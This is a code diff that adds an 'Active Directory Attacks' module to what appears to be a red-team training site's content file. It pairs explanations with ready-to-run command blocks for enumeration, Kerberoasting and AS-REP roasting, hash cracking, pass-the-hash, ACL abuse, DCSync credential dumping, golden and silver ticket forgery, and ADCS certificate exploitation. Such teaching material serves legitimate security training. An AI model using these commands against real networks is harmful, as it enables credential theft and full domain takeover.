@@ -1253,6 +1253,240 @@ int main() {
           }
         }
       ]
+    },
+    "active-directory": {
+      title: "Active Directory Attacks",
+      description: "Master AD enumeration, lateral movement, and domain dominance",
+      sections: [
+        {
+          type: "intro",
+          content: `Active Directory (AD) is the backbone of most enterprise networks. Understanding how to enumerate, attack, and pivot through AD environments is essential for red team operations. This module covers everything from initial reconnaissance to complete domain compromise.`
+        },
+        {
+          title: "Understanding Active Directory",
+          content: `Active Directory is Microsoft's directory service for Windows domain networks. It stores information about network resources and makes them accessible to users and applications.
+
+**Key Components:**
+• **Domain Controller (DC)**: Server that handles authentication and authorization
+• **Domain**: A logical group of network objects (users, computers, groups)
+• **Forest**: Collection of one or more domains that share a common schema
+• **Organizational Unit (OU)**: Container for organizing objects within a domain`,
+          concepts: [
+            { label: "LDAP", explanation: "Lightweight Directory Access Protocol - used to query AD" },
+            { label: "Kerberos", explanation: "Authentication protocol used by AD" },
+            { label: "NTLM", explanation: "Legacy authentication protocol, still widely used" },
+            { label: "SPN", explanation: "Service Principal Name - identifies service accounts" }
+          ],
+          tip: `Always start with enumeration! Understanding the AD structure before attacking gives you a roadmap for compromise.`
+        },
+        {
+          title: "Domain Enumeration",
+          content: `Before attacking, you need to understand the target environment. Enumeration reveals users, groups, computers, and trust relationships.
+
+**Key enumeration targets:**
+• Domain Admins and Enterprise Admins groups
+• Service accounts (often have weak passwords)
+• Computers with unconstrained delegation
+• Group Policy Objects (GPOs)
+• Trust relationships between domains`,
+          example: {
+            title: "PowerView Enumeration",
+            description: "Common PowerView commands for AD enumeration:",
+            code: `# Import PowerView
+Import-Module .\\PowerView.ps1
+
+# Get current domain info
+Get-Domain
+
+# Get all domain controllers
+Get-DomainController
+
+# Get all domain users
+Get-DomainUser | Select-Object samaccountname,description
+
+# Find Domain Admins
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+# Find computers with unconstrained delegation
+Get-DomainComputer -Unconstrained
+
+# Find users with SPNs (Kerberoastable)
+Get-DomainUser -SPN
+
+# Find all Group Policy Objects
+Get-DomainGPO | Select-Object displayname,gpcfilesyspath
+
+# Find shares
+Find-DomainShare -CheckShareAccess`,
+            language: "powershell"
+          }
+        },
+        {
+          title: "Kerberos Attacks",
+          content: `Kerberos is AD's primary authentication protocol. Understanding its weaknesses is crucial for privilege escalation.
+
+**AS-REP Roasting:**
+Target accounts without Kerberos pre-authentication. You can request their AS-REP and crack it offline.
+
+**Kerberoasting:**
+Request TGS tickets for service accounts and crack them offline. Service account passwords are often weak.`,
+          warning: `These attacks generate network traffic that can be detected. Use them sparingly and at appropriate times.`,
+          example: {
+            title: "Kerberos Attack Commands",
+            code: `# ASREPRoasting with Rubeus
+.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# With Impacket
+GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
+
+# Kerberoasting with Rubeus  
+.\\Rubeus.exe kerberoast /outfile:tgs.txt
+
+# With Impacket
+GetUserSPNs.py -request -dc-ip 10.10.10.1 domain.local/user:password
+
+# Crack with hashcat
+hashcat -m 18200 asrep.txt wordlist.txt  # AS-REP
+hashcat -m 13100 tgs.txt wordlist.txt    # TGS`,
+            language: "powershell"
+          }
+        },
+        {
+          title: "Lateral Movement",
+          content: `Once you have credentials, you need to move through the network to reach high-value targets.
+
+**Pass-the-Hash (PtH):**
+Use NTLM hash to authenticate without knowing the password.
+
+**Pass-the-Ticket (PtT):**
+Use stolen Kerberos tickets for authentication.
+
+**Overpass-the-Hash:**
+Convert NTLM hash to Kerberos ticket (best of both worlds).`,
+          concepts: [
+            { label: "NTLM Hash", explanation: "MD4 hash of user's password, sufficient for authentication" },
+            { label: "TGT", explanation: "Ticket Granting Ticket - proves identity to KDC" },
+            { label: "TGS", explanation: "Ticket Granting Service - grants access to specific services" },
+            { label: "Rubeus", explanation: "C# toolset for Kerberos interaction" }
+          ],
+          example: {
+            title: "Lateral Movement Commands",
+            code: `# Pass-the-Hash with mimikatz
+sekurlsa::pth /user:admin /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee
+
+# Pass-the-Hash with Impacket
+psexec.py -hashes :aad3b435b51404ee corp.local/admin@10.10.10.5
+
+# Pass-the-Ticket
+.\\Rubeus.exe ptt /ticket:base64_ticket
+
+# Overpass-the-Hash
+.\\Rubeus.exe asktgt /user:admin /rc4:ntlm_hash /ptt
+
+# Remote execution with WMI
+wmiexec.py -hashes :ntlm_hash domain/user@target
+
+# PowerShell Remoting
+Enter-PSSession -ComputerName DC01 -Credential $cred`,
+            language: "powershell"
+          }
+        },
+        {
+          title: "Privilege Escalation via ACLs",
+          content: `Active Directory Access Control Lists (ACLs) define permissions on AD objects. Misconfigurations can be exploited for privilege escalation.
+
+**Dangerous Permissions:**
+• **GenericAll**: Full control - can reset passwords, add to groups
+• **GenericWrite**: Modify attributes - can set SPN for Kerberoasting
+• **WriteDACL**: Modify permissions - grant yourself more access
+• **WriteOwner**: Take ownership - then modify permissions`,
+          tip: `BloodHound is essential for visualizing attack paths through ACL abuse. Always run it first!`,
+          example: {
+            title: "ACL Abuse Examples",
+            code: `# Find users with GenericAll on Domain Admins
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
+    ? {$_.ActiveDirectoryRights -match "GenericAll"} |
+    Select-Object SecurityIdentifier
+
+# If you have GenericAll - reset password
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
+
+# If you have GenericAll - add to group
+Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"
+
+# If you have GenericWrite - set SPN for Kerberoasting
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
+
+# Then Kerberoast the account
+.\\Rubeus.exe kerberoast /user:targetuser`,
+            language: "powershell"
+          }
+        },
+        {
+          title: "Domain Dominance",
+          content: `Once you have Domain Admin, these techniques provide persistent access and allow extracting all credentials.
+
+**DCSync:**
+Replicate domain controller data to extract all password hashes.
+
+**Golden Ticket:**
+Forge TGT with KRBTGT hash - unlimited access for 10 years.
+
+**Silver Ticket:**
+Forge TGS for specific services - more stealthy than Golden Ticket.`,
+          warning: `These techniques leave artifacts. DCSync generates replication traffic. Golden Tickets require the KRBTGT hash which means you've already compromised a DC.`,
+          example: {
+            title: "Domain Dominance Attacks",
+            code: `# DCSync - extract all hashes
+mimikatz # lsadump::dcsync /domain:corp.local /all
+
+# DCSync - extract specific user (like krbtgt)
+mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+
+# With Impacket
+secretsdump.py -just-dc corp.local/admin:password@DC01
+
+# Golden Ticket
+mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt
+
+# With Rubeus
+.\\Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /rc4:krbtgt_hash /ptt
+
+# Silver Ticket (for CIFS/file shares)
+mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:machine_hash /ptt`,
+            language: "powershell"
+          }
+        },
+        {
+          title: "AD Certificate Services (ADCS) Attacks",
+          content: `ADCS is frequently misconfigured, providing paths to domain compromise.
+
+**ESC1**: Certificate templates allowing requesters to specify SAN
+**ESC2**: Templates with Any Purpose EKU
+**ESC3**: Certificate Request Agent templates
+**ESC4**: Vulnerable certificate template ACLs
+**ESC8**: Web enrollment NTLM relay`,
+          example: {
+            title: "ADCS Enumeration and Exploitation",
+            code: `# Enumerate vulnerable templates with Certify
+.\\Certify.exe find /vulnerable
+
+# ESC1 - Request cert with admin SAN
+.\\Certify.exe request /ca:CA01.corp.local\\corp-CA /template:VulnTemplate /altname:administrator
+
+# Convert to PFX
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
+
+# Use cert for authentication
+.\\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt
+
+# With Certipy (Python)
+certipy find -u user@corp.local -p password -dc-ip 10.10.10.1
+certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template VulnTemplate -upn administrator@corp.local`,
+            language: "powershell"
+          }
+        }
+      ]
     }
   };
 
